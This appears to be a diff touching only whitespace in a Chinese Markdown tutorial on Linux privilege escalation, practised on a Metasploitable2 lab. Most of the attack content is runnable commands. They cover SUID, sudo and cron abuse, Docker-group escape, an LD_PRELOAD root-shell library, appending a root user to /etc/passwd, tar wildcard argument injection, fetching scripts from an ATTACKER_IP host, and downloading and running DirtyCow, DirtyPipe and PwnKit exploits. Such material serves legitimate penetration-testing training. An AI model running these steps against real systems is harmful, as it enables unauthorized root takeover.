@@ -8,29 +8,29 @@
 
 - [[#一、提权前的准备工作|一、提权前的准备工作]]
 - [[#二、第一阶段 信息收集工具|二、第一阶段: 信息收集工具]]
-  - [[#2.1 LinEnum|2.1 LinEnum]]
-  - [[#2.2 linPEAS|2.2 linPEAS]]
-  - [[#2.3 linux-exploit-suggester|2.3 linux-exploit-suggester]]
-  - [[#2.4 linuxprivchecker|2.4 linuxprivchecker]]
-  - [[#2.5 unix-privesc-check|2.5 unix-privesc-check]]
+ - [[#2.1 LinEnum|2.1 LinEnum]]
+ - [[#2.2 linPEAS|2.2 linPEAS]]
+ - [[#2.3 linux-exploit-suggester|2.3 linux-exploit-suggester]]
+ - [[#2.4 linuxprivchecker|2.4 linuxprivchecker]]
+ - [[#2.5 unix-privesc-check|2.5 unix-privesc-check]]
 - [[#三、第二阶段 提权技术路线|三、第二阶段: 提权技术路线]]
-  - [[#3.1 SUID二进制文件提权|3.1 SUID二进制文件提权]]
-  - [[#3.2 Sudo配置错误|3.2 Sudo配置错误]]
-  - [[#3.3 Cron任务劫持|3.3 Cron任务劫持]]
-  - [[#3.4 可写服务文件|3.4 可写服务文件]]
-  - [[#3.5 Docker组提权|3.5 Docker组提权]]
-  - [[#3.6 能力Capabilities提权|3.6 能力(Capabilities)提权]]
-  - [[#3.7 NFS no_root_squash|3.7 NFS no_root_squash]]
-  - [[#3.8 可写passwd提权|3.8 可写/etc/passwd提权]]
-  - [[#3.9 LD_PRELOAD提权|3.9 LD_PRELOAD / LD_LIBRARY_PATH提权]]
-  - [[#3.10 PATH变量劫持|3.10 PATH变量劫持]]
+ - [[#3.1 SUID二进制文件提权|3.1 SUID二进制文件提权]]
+ - [[#3.2 Sudo配置错误|3.2 Sudo配置错误]]
+ - [[#3.3 Cron任务劫持|3.3 Cron任务劫持]]
+ - [[#3.4 可写服务文件|3.4 可写服务文件]]
+ - [[#3.5 Docker组提权|3.5 Docker组提权]]
+ - [[#3.6 能力Capabilities提权|3.6 能力(Capabilities)提权]]
+ - [[#3.7 NFS no_root_squash|3.7 NFS no_root_squash]]
+ - [[#3.8 可写passwd提权|3.8 可写/etc/passwd提权]]
+ - [[#3.9 LD_PRELOAD提权|3.9 LD_PRELOAD / LD_LIBRARY_PATH提权]]
+ - [[#3.10 PATH变量劫持|3.10 PATH变量劫持]]
 - [[#四、第三阶段 内核漏洞提权|四、第三阶段: 内核漏洞提权]]
-  - [[#4.1 DirtyCow|4.1 DirtyCow (CVE-2016-5195)]]
-  - [[#4.2 DirtyPipe|4.2 DirtyPipe (CVE-2022-0847)]]
-  - [[#4.3 PwnKit|4.3 PwnKit (CVE-2021-4034)]]
-  - [[#4.4 OverlayFS|4.4 OverlayFS (CVE-2021-3493 / CVE-2023-0386)]]
-  - [[#4.5 自动化匹配|4.5 使用linux-exploit-suggester自动化匹配]]
-  - [[#4.6 内核漏洞注意事项|4.6 内核漏洞提权注意事项]]
+ - [[#4.1 DirtyCow|4.1 DirtyCow (CVE-2016-5195)]]
+ - [[#4.2 DirtyPipe|4.2 DirtyPipe (CVE-2022-0847)]]
+ - [[#4.3 PwnKit|4.3 PwnKit (CVE-2021-4034)]]
+ - [[#4.4 OverlayFS|4.4 OverlayFS (CVE-2021-3493 / CVE-2023-0386)]]
+ - [[#4.5 自动化匹配|4.5 使用linux-exploit-suggester自动化匹配]]
+ - [[#4.6 内核漏洞注意事项|4.6 内核漏洞提权注意事项]]
 - [[#五、完整实践 Metasploitable2|五、完整实践: Metasploitable2手动提权]]
 
 ## 一、提权前的准备工作
@@ -39,25 +39,25 @@
 
 ```mermaid
 flowchart TD
-    A[获取低权限Shell] --> B[信息收集]
-    B --> C{发现潜在向量?}
-    C -->|SUID二进制| D[GTFOBins查询利用]
-    C -->|Sudo配置| E[sudo -l 分析利用]
-    C -->|Cron任务| F[检查可写脚本]
-    C -->|内核漏洞| G[linux-exploit-suggester]
-    C -->|可写passwd| H[添加root用户]
-    C -->|Capabilities| I[getcap分析]
-    C -->|Docker组| J[容器逃逸]
-    C -->|NFS| K[no_root_squash]
-    D --> L[获得root]
-    E --> L
-    F --> L
-    G --> L
-    H --> L
-    I --> L
-    J --> L
-    K --> L
-    L --> M[持久化 + 横向移动]
+ A[获取低权限Shell] --> B[信息收集]
+ B --> C{发现潜在向量?}
+ C -->|SUID二进制| D[GTFOBins查询利用]
+ C -->|Sudo配置| E[sudo -l 分析利用]
+ C -->|Cron任务| F[检查可写脚本]
+ C -->|内核漏洞| G[linux-exploit-suggester]
+ C -->|可写passwd| H[添加root用户]
+ C -->|Capabilities| I[getcap分析]
+ C -->|Docker组| J[容器逃逸]
+ C -->|NFS| K[no_root_squash]
+ D --> L[获得root]
+ E --> L
+ F --> L
+ G --> L
+ H --> L
+ I --> L
+ J --> L
+ K --> L
+ L --> M[持久化 + 横向移动]
 ```
 
 提权的核心逻辑：
@@ -117,13 +117,13 @@ LinEnum收集的信息包括：
 LinEnum输出解读 - 重点关注：
 
 ```
-[-] Kernel information    → 内核版本（匹配CVE）
-[-] SUID files           → 高亮显示，重点分析
-[-] SGID files           → 可能可写的SGID文件
-[-] Writable files       → /etc/passwd, /etc/shadow等
-[-] Cron jobs            → 定时任务脚本
-[-] Sudo version         → 是否有sudo提权漏洞
-[-] Processes             → 以root运行的进程
+[-] Kernel information → 内核版本（匹配CVE）
+[-] SUID files → 高亮显示，重点分析
+[-] SGID files → 可能可写的SGID文件
+[-] Writable files → /etc/passwd, /etc/shadow等
+[-] Cron jobs → 定时任务脚本
+[-] Sudo version → 是否有sudo提权漏洞
+[-] Processes → 以root运行的进程
 ```
 
 ### 2.2 linPEAS
@@ -177,11 +177,11 @@ chmod +x /tmp/les.sh
 输出解读（优先级排序）：
 
 ```
-[CVE-2022-0847] DirtyPipe        → 内核 5.8 - 5.16.11，稳定且影响范围广
-[CVE-2021-4034] PwnKit (pkexec)   → 几乎所有Linux都受影响
-[CVE-2016-5195] DirtyCow         → 经典稳定提权
-[CVE-2021-3156] sudoedit          → sudo版本漏洞
-[CVE-2023-0386] OverlayFS         → 较新内核
+[CVE-2022-0847] DirtyPipe → 内核 5.8 - 5.16.11，稳定且影响范围广
+[CVE-2021-4034] PwnKit (pkexec) → 几乎所有Linux都受影响
+[CVE-2016-5195] DirtyCow → 经典稳定提权
+[CVE-2021-3156] sudoedit → sudo版本漏洞
+[CVE-2023-0386] OverlayFS → 较新内核
 ```
 
 如果工具没有推荐，可以加 `-k` 参数进行更深入的检查：
@@ -235,7 +235,7 @@ wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/u
 wget http://ATTACKER_IP:8080/upc.sh -O /tmp/upc.sh
 chmod +x /tmp/upc.sh
 /tmp/upc.sh standard > /tmp/upc_standard
-/tmp/upc.sh thorough > /tmp/upc_thorough   # 更深入的检查
+/tmp/upc.sh thorough > /tmp/upc_thorough # 更深入的检查
 ```
 
 ## 三、第二阶段: 提权技术路线
@@ -262,7 +262,7 @@ vim -c ':python3 import os; os.setuid(0); os.system("/bin/bash")'
 # 或通过vim打开后 :!bash 或 :shell
 
 # 3) bash (罕见)
-/bin/bash -p   # -p保持euid
+/bin/bash -p # -p保持euid
 
 # 4) cp/mv - 覆盖/etc/passwd
 echo "root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" >> /etc/passwd
@@ -290,13 +290,13 @@ sudo -l
 危险条目示例：
 
 ```
-(ALL) NOPASSWD: ALL              → 直接 sudo su 获得root
-(root) NOPASSWD: /usr/bin/vim    → sudo vim -c ':!/bin/bash'
-(root) NOPASSWD: /usr/bin/less   → sudo less file → !bash
-(root) NOPASSWD: /usr/bin/man    → sudo man man → !bash
-(root) NOPASSWD: /usr/bin/find   → sudo find . -exec /bin/bash \;
+(ALL) NOPASSWD: ALL → 直接 sudo su 获得root
+(root) NOPASSWD: /usr/bin/vim → sudo vim -c ':!/bin/bash'
+(root) NOPASSWD: /usr/bin/less → sudo less file → !bash
+(root) NOPASSWD: /usr/bin/man → sudo man man → !bash
+(root) NOPASSWD: /usr/bin/find → sudo find . -exec /bin/bash \;
 (root) NOPASSWD: /usr/bin/python → sudo python3 -c 'import os; os.system("/bin/bash")'
-env_keep+=LD_PRELOAD             → 编译.so库劫持函数
+env_keep+=LD_PRELOAD → 编译.so库劫持函数
 ```
 
 Sudo漏洞提权（无需特权sudo条目）：
@@ -350,7 +350,7 @@ touch "/var/backup/--checkpoint-action=exec=sh runme.sh"
 # 检查可写的服务文件
 find /etc/systemd/system /usr/lib/systemd/system -writable -type f 2>/dev/null
 find /etc/systemd/system /usr/lib/systemd/system -type f -name "*.service" 2>/dev/null | while read f; do
-  [ -w "$f" ] && echo "[!] 可写: $f"
+ [ -w "$f" ] && echo "[!] 可写: $f"
 done
 ```
 
@@ -374,7 +374,7 @@ id | grep docker
 
 # 如果用户在docker组中
 docker run -v /:/mnt -it alpine chroot /mnt
-whoami  # root
+whoami # root
 
 # 更简单的方式
 docker run -v /:/mnt -it alpine /bin/sh
@@ -448,10 +448,10 @@ cat <<EOF > shell.c
 #include <sys/types.h>
 #include <stdlib.h>
 void _init() {
-  unsetenv("LD_PRELOAD");
-  setuid(0);
-  setgid(0);
-  system("/bin/bash");
+ unsetenv("LD_PRELOAD");
+ setuid(0);
+ setgid(0);
+ system("/bin/bash");
 }
 EOF
 
@@ -482,7 +482,7 @@ wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
 gcc -pthread dirty.c -o dirty -lcrypt
 ./dirty password123
 su firefart
-whoami  # root
+whoami # root
 ```
 
 ### 4.2 DirtyPipe (CVE-2022-0847)
@@ -493,7 +493,7 @@ whoami  # root
 wget https://raw.githubusercontent.com/nicholasaleks/CVE-2022-0847/master/Dirty-Pipe.sh
 chmod +x Dirty-Pipe.sh
 ./Dirty-Pipe.sh
-whoami  # root
+whoami # root
 
 # 或者编译版
 wget https://haxx.in/files/dirtypipez.c
@@ -510,7 +510,7 @@ su
 wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c
 gcc PwnKit.c -o PwnKit
 ./PwnKit
-whoami  # root
+whoami # root
 ```
 
 ### 4.4 OverlayFS (CVE-2021-3493 / CVE-2023-0386)
@@ -580,7 +580,7 @@ PASS anything
 
 # 新终端
 nc 192.168.56.102 6200
-whoami   # root (直接给root)
+whoami # root (直接给root)
 ```
 
 **Phase 2: 信息收集 (以www-data为例)**
@@ -633,8 +633,8 @@ gcc /tmp/exp.c -o /tmp/exp
 /tmp/exp
 
 # 验证
-whoami   # root
-id       # uid=0(root) gid=0(root)
+whoami # root
+id # uid=0(root) gid=0(root)
 ```
 
 **Phase 5: 提取哈希**
